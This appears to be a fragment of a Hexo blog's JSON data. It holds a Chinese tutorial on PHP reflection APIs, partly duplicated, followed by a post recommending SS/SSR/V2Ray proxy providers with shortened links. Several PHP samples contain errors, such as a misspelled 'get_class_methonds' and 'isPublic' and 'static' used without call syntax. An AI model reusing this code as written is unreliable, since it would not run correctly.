class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$student = <span class=\"keyword\">new</span> Person();</span><br><span class=\"line\"></span><br><span class=\"line\">$student-&gt;name = <span class=\"string\">'Ton'</span>;</span><br><span class=\"line\">$student-&gt;gender = <span class=\"string\">'male'</span>;</span><br><span class=\"line\">$student-&gt;age = <span class=\"string\">'24'</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"使用API获取属性和方法\"><a href=\"#使用API获取属性和方法\" class=\"headerlink\" title=\"使用API获取属性和方法\"></a>使用API获取属性和方法</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//获取对象属性列表</span></span><br><span class=\"line\"></span><br><span class=\"line\">$reflect = <span class=\"keyword\">new</span> ReflectionObject($student);</span><br><span class=\"line\">$props = $reflect-&gt;getProperties();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span> ($props <span class=\"keyword\">as</span> $prop) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">print</span> $prop-&gt;getName();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//获取对象方法列表</span></span><br><span class=\"line\">$m = $reflect-&gt;getMethods();</span><br><span class=\"line\"><span class=\"keyword\">foreach</span> ($m <span class=\"keyword\">as</span> $prop) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">print</span> $prop-&gt;getName();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"使用class函数获取属性和方法\"><a href=\"#使用class函数获取属性和方法\" class=\"headerlink\" title=\"使用class函数获取属性和方法\"></a>使用class函数获取属性和方法</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//返回对象属性的关联数组</span></span><br><span class=\"line\">var_dump(get_object_vars($student));</span><br><span class=\"line\"><span class=\"comment\">//类属性</span></span><br><span class=\"line\">var_dump(get_class_vars(get_class($student)));</span><br><span class=\"line\"><span class=\"comment\">//返回由类的方法组成的数组</span></span><br><span class=\"line\">var_dump(get_class_methonds(get_class($student)));</span><br></pre></td></tr></table></figure>\n<h3 id=\"获取对象属于哪个类\"><a href=\"#获取对象属于哪个类\" class=\"headerlink\" title=\"获取对象属于哪个类\"></a>获取对象属于哪个类</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">echo</span> get_class($student);</span><br></pre></td></tr></table></figure>\n<h3 id=\"还原类原型\"><a href=\"#还原类原型\" class=\"headerlink\" title=\"还原类原型\"></a>还原类原型</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//反射获取类的原型</span></span><br><span class=\"line\">$obj = <span class=\"keyword\">new</span> ReflectionClass(<span class=\"string\">'person'</span>);</span><br><span class=\"line\">$className = $obj-&gt;getName();</span><br><span class=\"line\">$methods = $properties = [];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span> ($obj-&gt;getProperties() <span class=\"keyword\">as</span> $v) &#123;</span><br><span class=\"line\">    $properties[$v-&gt;getName()] = $v;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span> ($obj-&gt;getMethods() <span class=\"keyword\">as</span> $v) &#123;</span><br><span class=\"line\">    $methods[$v-&gt;getName()] = $v;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"class &#123;$className&#125;\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">is_array($properties) &amp;&amp; ksort($properties);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span>($properties <span class=\"keyword\">as</span> $k =&gt; $v) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $v-&gt;isPublic ? <span class=\"string\">'public'</span> : <span class=\"string\">''</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $v-&gt;isPrivate ? <span class=\"string\">'private'</span> : <span class=\"string\">''</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $v-&gt;isProtected ? <span class=\"string\">'protected'</span> : <span class=\"string\">''</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $v-&gt;static ? <span class=\"string\">'static'</span> : <span class=\"string\">''</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (is_array($methods)) ksort($methods);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span> ($methods <span class=\"keyword\">as</span> $k =&gt; $v) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"function&#123;$k&#125;()&#123;&#125;\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>PHP手册关于反射API有几十个，反射完整的描述了一个类或对象的原型，反射不仅可以用于类和对象，还可以用于函数，扩展模块，异常等</p>\n<h3 id=\"结语\"><a href=\"#结语\" class=\"headerlink\" title=\"结语\"></a>结语</h3><p>善用反射能保持代码的优雅和简洁，但反射也会破坏类的封装性，因为反射可以使本不该暴露的方法或属性被强制暴露了出来，是优点也是缺点</p>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>面向对象编程中对象被赋予了自省的能力，而这个自省的过程就是反射，反射直观的理解就是根据到达地找出出发地和来源</p>\n<p>反射指在PHP运行状态中，扩展分析PHP程序，到处或提取出类，方法，属性，参数等详细信息，包括注释</p>","more":"<h3 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Person</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $name;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $gender;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">say</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;name <span class=\"string\">':'</span> <span class=\"keyword\">$this</span>-&gt;gender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__set</span><span class=\"params\">($name, $value)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'setting $name to $value'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;$name = $value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span><span class=\"params\">($name)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;$name)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'未设置'</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;$name = <span class=\"string\">'默认值'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;$name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$student = <span class=\"keyword\">new</span> Person();</span><br><span class=\"line\"></span><br><span class=\"line\">$student-&gt;name = <span class=\"string\">'Ton'</span>;</span><br><span class=\"line\">$student-&gt;gender = <span class=\"string\">'male'</span>;</span><br><span class=\"line\">$student-&gt;age = <span class=\"string\">'24'</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"使用API获取属性和方法\"><a href=\"#使用API获取属性和方法\" class=\"headerlink\" title=\"使用API获取属性和方法\"></a>使用API获取属性和方法</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//获取对象属性列表</span></span><br><span class=\"line\"></span><br><span class=\"line\">$reflect = <span class=\"keyword\">new</span> ReflectionObject($student);</span><br><span class=\"line\">$props = $reflect-&gt;getProperties();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span> ($props <span class=\"keyword\">as</span> $prop) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">print</span> $prop-&gt;getName();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//获取对象方法列表</span></span><br><span class=\"line\">$m = $reflect-&gt;getMethods();</span><br><span class=\"line\"><span class=\"keyword\">foreach</span> ($m <span class=\"keyword\">as</span> $prop) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">print</span> $prop-&gt;getName();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"使用class函数获取属性和方法\"><a href=\"#使用class函数获取属性和方法\" class=\"headerlink\" title=\"使用class函数获取属性和方法\"></a>使用class函数获取属性和方法</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//返回对象属性的关联数组</span></span><br><span class=\"line\">var_dump(get_object_vars($student));</span><br><span class=\"line\"><span class=\"comment\">//类属性</span></span><br><span class=\"line\">var_dump(get_class_vars(get_class($student)));</span><br><span class=\"line\"><span class=\"comment\">//返回由类的方法组成的数组</span></span><br><span class=\"line\">var_dump(get_class_methonds(get_class($student)));</span><br></pre></td></tr></table></figure>\n<h3 id=\"获取对象属于哪个类\"><a href=\"#获取对象属于哪个类\" class=\"headerlink\" title=\"获取对象属于哪个类\"></a>获取对象属于哪个类</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">echo</span> get_class($student);</span><br></pre></td></tr></table></figure>\n<h3 id=\"还原类原型\"><a href=\"#还原类原型\" class=\"headerlink\" title=\"还原类原型\"></a>还原类原型</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//反射获取类的原型</span></span><br><span class=\"line\">$obj = <span class=\"keyword\">new</span> ReflectionClass(<span class=\"string\">'person'</span>);</span><br><span class=\"line\">$className = $obj-&gt;getName();</span><br><span class=\"line\">$methods = $properties = [];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span> ($obj-&gt;getProperties() <span class=\"keyword\">as</span> $v) &#123;</span><br><span class=\"line\">    $properties[$v-&gt;getName()] = $v;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span> ($obj-&gt;getMethods() <span class=\"keyword\">as</span> $v) &#123;</span><br><span class=\"line\">    $methods[$v-&gt;getName()] = $v;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"class &#123;$className&#125;\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">is_array($properties) &amp;&amp; ksort($properties);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span>($properties <span class=\"keyword\">as</span> $k =&gt; $v) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $v-&gt;isPublic ? <span class=\"string\">'public'</span> : <span class=\"string\">''</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $v-&gt;isPrivate ? <span class=\"string\">'private'</span> : <span class=\"string\">''</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $v-&gt;isProtected ? <span class=\"string\">'protected'</span> : <span class=\"string\">''</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $v-&gt;static ? <span class=\"string\">'static'</span> : <span class=\"string\">''</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (is_array($methods)) ksort($methods);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span> ($methods <span class=\"keyword\">as</span> $k =&gt; $v) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"function&#123;$k&#125;()&#123;&#125;\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>PHP手册关于反射API有几十个，反射完整的描述了一个类或对象的原型，反射不仅可以用于类和对象，还可以用于函数，扩展模块，异常等</p>\n<h3 id=\"结语\"><a href=\"#结语\" class=\"headerlink\" title=\"结语\"></a>结语</h3><p>善用反射能保持代码的优雅和简洁，但反射也会破坏类的封装性，因为反射可以使本不该暴露的方法或属性被强制暴露了出来，是优点也是缺点</p>"},{"layout":"post","title":"SS/SSR提供商","abbrlink":39062,"_content":"\n### 前言\n\n自己经常用的一些梯子，且用且珍惜\n\n<!--more-->\n\n### MENGDI-Cloud\n\n现已接入台湾HINET中华电信,香港HKT、WTT、HKBN、HGC、阿里云CN2、俄罗斯伯力、韩国KT、SK、LG、azure、新加坡CN2、美国CN2、香港azure、日本IIJ、软银,高达1Gbps数据传输最大全力保证大陆宽带,旗下站点X-AIR主要运营V2ray加速\n\n官方网址：https://wan.sc.cn\n\n### 喵帕斯\n\n\n极限速度很快，稳定性不错，香港机子比较多\n\n官网： https://www.喵帕斯.com\n\n邀请码可私聊bot： https://t.me/duyao_bot\n\n### RixCloud\n\n全部节点BGP中继阿里云机房（500M/300M/200M） 虽然看起来延迟比直连要高一些，但是实际起速要比直连还快很多，而且稳定\n\n官网：https://bit.ly/2M7G1Rm\n\n\n### ssrcloud\n\n性价比也很好，部分线路0.1倍率。  180+节点，新增多条BGP线路\n\n网站：https://bit.ly/2IvnxVW\n\n### MunCloud\n\n新增部分阿里云内网专线。总体来说还算不错的一家，性价比不错。60+节点。\n\n网站：https://bit.ly/2QOlRdV\n\n### 百草园\n\n晚高峰测了测，速度还算不错，流量给的也很足\n\n官网：https://bit.ly/2wDqDkX\n\n### 次元链接\n\n也是一家大站了，之前在youtube上见过，人数不少，试了试总体速度还不错，性价比还可以。总节点数90+\n\n官网：https://k0.pw/vrrno1\n\n### SWCloud星愿云\n\n试速度还可以，性价比也OK。总节点数50+\n\n官网： https://bit.ly/2MN614G\n\n### CTCloud\n\n晚高峰的时候测过几天速，还不错，价钱也不贵，性价比还可以，线路大概在40条\n\n官网：https://bit.ly/2K25mcR\n\n### STC-server\n\n不过速度还不错，性价比不错\n\n官网：https://bit.ly/2IsvRFI\n\n### BigHead\n\n一家运营快一年的机场，之前是公益机场，现在主打AZ节点\n\n官网：https://bit.ly/2VPGjM9\n\nTG： https://t.me/BigHeadSSRV2ray\n\n### Catchflying\n\n速度还不错。35+节点\n\n官网：https://bit.ly/2F7O3DH\n\nTG： https://t.me/catchflying\n\n\n### AAEX\n\n大概有45+节点\n\n官网：https://bit.ly/2VRui99\n\n### Dler Cloud\n\n机场包括部分中继节点，港台日等地区节点也挺多，150+节点，包括国际标准节点、国际高级节点、国际优化节点、中国大陆节点等等。\n\n注册购买: https://dlercloud.io\n官方网站: https://dlercloud.io","source":"_posts/2019/6/SS SSR提供商.md","raw":"---\nlayout: post\ntitle: SS/SSR提供商\ntags:\n  - ssr\ncategories:\n  - 科学上网\nabbrlink: 39062\n---\n\n### 前言\n\n自己经常用的一些梯子，且用且珍惜\n\n<!--more-->\n\n### MENGDI-Cloud\n\n现已接入台湾HINET中华电信,香港HKT、WTT、HKBN、HGC、阿里云CN2、俄罗斯伯力、韩国KT、SK、LG、azure、新加坡CN2、美国CN2、香港azure、日本IIJ、软银,高达1Gbps数据传输最大全力保证大陆宽带,旗下站点X-AIR主要运营V2ray加速\n\n官方网址：https://wan.sc.cn\n\n### 喵帕斯\n\n\n极限速度很快，稳定性不错，香港机子比较多\n\n官网： https://www.喵帕斯.com\n\n邀请码可私聊bot： https://t.me/duyao_bot\n\n### RixCloud\n\n全部节点BGP中继阿里云机房（500M/300M/200M） 虽然看起来延迟比直连要高一些，但是实际起速要比直连还快很多，而且稳定\n\n官网：https://bit.ly/2M7G1Rm\n\n\n### ssrcloud\n\n性价比也很好，部分线路0.1倍率。  180+节点，新增多条BGP线路\n\n网站：https://bit.ly/2IvnxVW\n\n### MunCloud\n\n新增部分阿里云内网专线。总体来说还算不错的一家，性价比不错。60+节点。\n\n网站：https://bit.ly/2QOlRdV\n\n### 百草园\n\n晚高峰测了测，速度还算不错，流量给的也很足\n\n官网：https://bit.ly/2wDqDkX\n\n### 次元链接\n\n也是一家大站了，之前在youtube上见过，人数不少，试了试总体速度还不错，性价比还可以。总节点数90+\n\n官网：https://k0.pw/vrrno1\n\n### SWCloud星愿云\n\n试速度还可以，性价比也OK。总节点数50+\n\n官网： https://bit.ly/2MN614G\n\n### CTCloud\n\n晚高峰的时候测过几天速，还不错，价钱也不贵，性价比还可以，线路大概在40条\n\n官网：https://bit.ly/2K25mcR\n\n### STC-server\n\n不过速度还不错，性价比不错\n\n官网：https://bit.ly/2IsvRFI\n\n### BigHead\n\n一家运营快一年的机场，之前是公益机场，现在主打AZ节点\n\n官网：https://bit.ly/2VPGjM9\n\nTG： https://t.me/BigHeadSSRV2ray\n\n### Catchflying\n\n速度还不错。35+节点\n\n官网：https://bit.ly/2F7O3DH\n\nTG： https://t.me/catchflying\n\n\n### AAEX\n\n大概有45+节点\n\n官网：https://bit.ly/2VRui99\n\n### Dler Cloud\n\n机场包括部分中继节点，港台日等地区节点也挺多，150+节点，包括国际标准节点、国际高级节点、国际优化节点、中国大陆节点等等。\n\n注册购买: https://dlercloud.io\n官方网站: https://dlercloud.io","slug":"2019/6/SS SSR提供商","published":1,"date":"2019-06-26T05:40:20.404Z","updated":"2020-04-12T06:34:43.625Z","comments":1,"photos":[],"link":"","_id":"ck9z76vzq001744vql9tpfnx9","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>自己经常用的一些梯子，且用且珍惜</p>\n<a id=\"more\"></a>\n<h3 id=\"MENGDI-Cloud\"><a href=\"#MENGDI-Cloud\" class=\"headerlink\" title=\"MENGDI-Cloud\"></a>MENGDI-Cloud</h3><p>现已接入台湾HINET中华电信,香港HKT、WTT、HKBN、HGC、阿里云CN2、俄罗斯伯力、韩国KT、SK、LG、azure、新加坡CN2、美国CN2、香港azure、日本IIJ、软银,高达1Gbps数据传输最大全力保证大陆宽带,旗下站点X-AIR主要运营V2ray加速</p>\n<p>官方网址：<a href=\"https://wan.sc.cn\" target=\"_blank\" rel=\"noopener\">https://wan.sc.cn</a></p>\n<h3 id=\"喵帕斯\"><a href=\"#喵帕斯\" class=\"headerlink\" title=\"喵帕斯\"></a>喵帕斯</h3><p>极限速度很快，稳定性不错，香港机子比较多</p>\n<p>官网： <a href=\"https://www.喵帕斯.com\" target=\"_blank\" rel=\"noopener\">https://www.喵帕斯.com</a></p>\n<p>邀请码可私聊bot： <a href=\"https://t.me/duyao_bot\" target=\"_blank\" rel=\"noopener\">https://t.me/duyao_bot</a></p>\n<h3 id=\"RixCloud\"><a href=\"#RixCloud\" class=\"headerlink\" title=\"RixCloud\"></a>RixCloud</h3><p>全部节点BGP中继阿里云机房（500M/300M/200M） 虽然看起来延迟比直连要高一些，但是实际起速要比直连还快很多，而且稳定</p>\n<p>官网：<a href=\"https://bit.ly/2M7G1Rm\" target=\"_blank\" rel=\"noopener\">https://bit.ly/2M7G1Rm</a></p>\n<h3 id=\"ssrcloud\"><a href=\"#ssrcloud\" class=\"headerlink\" title=\"ssrcloud\"></a>ssrcloud</h3><p>性价比也很好，部分线路0.1倍率。  180+节点，新增多条BGP线路</p>\n<p>网站：<a href=\"https://bit.ly/2IvnxVW\" target=\"_blank\" rel=\"noopener\">https://bit.ly/2IvnxVW</a></p>\n<h3 id=\"MunCloud\"><a href=\"#MunCloud\" class=\"headerlink\" title=\"MunCloud\"></a>MunCloud</h3><p>新增部分阿里云内网专线。总体来说还算不错的一家，性价比不错。60+节点。</p>\n<p>网站：<a href=\"https://bit.ly/2QOlRdV\" target=\"_blank\" rel=\"noopener\">https://bit.ly/2QOlRdV</a></p>\n<h3 id=\"百草园\"><a href=\"#百草园\" class=\"headerlink\" title=\"百草园\"></a>百草园</h3><p>晚高峰测了测，速度还算不错，流量给的也很足</p>\n<p>官网：<a href=\"https://bit.ly/2wDqDkX\" target=\"_blank\" rel=\"noopener\">https://bit.ly/2wDqDkX</a></p>\n<h3 id=\"次元链接\"><a href=\"#次元链接\" class=\"headerlink\" title=\"次元链接\"></a>次元链接</h3><p>也是一家大站了，之前在youtube上见过，人数不少，试了试总体速度还不错，性价比还可以。总节点数90+</p>\n<p>官网：<a href=\"https://k0.pw/vrrno1\" target=\"_blank\" rel=\"noopener\">https://k0.pw/vrrno1</a></p>\n<h3 id=\"SWCloud星愿云\"><a href=\"#SWCloud星愿云\" class=\"headerlink\" title=\"SWCloud星愿云\"></a>SWCloud星愿云</h3><p>试速度还可以，性价比也OK。总节点数50+</p>\n<p>官网： <a href=\"https://bit.ly/2MN614G\" target=\"_blank\" rel=\"noopener\">https://bit.ly/2MN614G</a></p>\n<h3 id=\"CTCloud\"><a href=\"#CTCloud\" class=\"headerlink\" title=\"CTCloud\"></a>CTCloud</h3><p>晚高峰的时候测过几天速，还不错，价钱也不贵，性价比还可以，线路大概在40条</p>\n<p>官网：<a href=\"https://bit.ly/2K25mcR\" target=\"_blank\" rel=\"noopener\">https://bit.ly/2K25mcR</a></p>\n<h3 id=\"STC-server\"><a href=\"#STC-server\" class=\"headerlink\" title=\"STC-server\"></a>STC-server</h3><p>不过速度还不错，性价比不错</p>\n<p>官网：<a href=\"https://bit.ly/2IsvRFI\" target=\"_blank\" rel=\"noopener\">https://bit.ly/2IsvRFI</a></p>\n<h3 id=\"BigHead\"><a href=\"#BigHead\" class=\"headerlink\" title=\"BigHead\"></a>BigHead</h3><p>一家运营快一年的机场，之前是公益机场，现在主打AZ节点</p>\n<p>官网：<a href=\"https://bit.ly/2VPGjM9\" target=\"_blank\" rel=\"noopener\">https://bit.ly/2VPGjM9</a></p>\n<p>TG： <a href=\"https://t.me/BigHeadSSRV2ray\" target=\"_blank\" rel=\"noopener\">https://t.me/BigHeadSSRV2ray</a></p>\n<h3 id=\"Catchflying\"><a href=\"#Catchflying\" class=\"headerlink\" title=\"Catchflying\"></a>Catchflying</h3><p>速度还不错。35+节点</p>\n<p>官网：<a href=\"https://bit.ly/2F7O3DH\" target=\"_blank\" rel=\"noopener\">https://bit.ly/2F7O3DH</a></p>\n<p>TG： <a href=\"https://t.me/catchflying\" target=\"_blank\" rel=\"noopener\">https://t.me/catchflying</a></p>\n<h3 id=\"AAEX\"><a href=\"#AAEX\" class=\"headerlink\" title=\"AAEX\"></a>AAEX</h3><p>大概有45+节点</p>\n<p>官网：<a href=\"https://bit.ly/2VRui99\" target=\"_blank\" rel=\"noopener\">https://bit.ly/2VRui99</a></p>\n<h3 id=\"Dler-Cloud\"><a href=\"#Dler-Cloud\" class=\"headerlink\" title=\"Dler Cloud\"></a>Dler Cloud</h3><p>机场包括部分中继节点，港台日等地区节点也挺多，150+节点，包括国际标准节点、国际高级节点、国际优化节点、中国大陆节点等等。</p>\n<p>注册购买: <a href=\"https://dlercloud.io\" target=\"_blank\" rel=\"noopener\">https://dlercloud.io</a><br>官方网站: <a href=\"https://dlercloud.io\" target=\"_blank\" rel=\"noopener\">https://dlercloud.io</a></p>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>自己经常用的一些梯子，且用且珍惜</p>","more":"<h3 id=\"MENGDI-Cloud\"><a href=\"#MENGDI-Cloud\" class=\"headerlink\" title=\"MENGDI-Cloud\"></a>MENGDI-Cloud</h3><p>现已接入台湾HINET中华电信,香港HKT、WTT、HKBN、HGC、阿里云CN2、俄罗斯伯力、韩国KT、SK、LG、azure、新加坡CN2、美国CN2、香港azure、日本IIJ、软银,高达1Gbps数据传输最大全力保证大陆宽带,旗下站点X-AIR主要运营V2ray加速</p>\n<p>官方网址：<a href=\"https://wan.sc.cn\" target=\"_blank\" rel=\"noopener\">https://wan.sc.cn</a></p>\n<h3 id=\"喵帕斯\"><a href=\"#喵帕斯\" class=\"headerlink\" title=\"喵帕斯\"></a>喵帕斯</h3><p>极限速度很快，稳定性不错，香港机子比较多</p>\n<p>官网： <a href=\"https://www.喵帕斯.com\" target=\"_blank\" rel=\"noopener\">https://www.喵帕斯.com</a></p>\n<p>邀请码可私聊bot： <a href=\"https://t.me/duyao_bot\" target=\"_blank\" rel=\"noopener\">https://t.me/duyao_bot</a></p>\n<h3 id=\"RixCloud\"><a href=\"#RixCloud\" class=\"headerlink\" 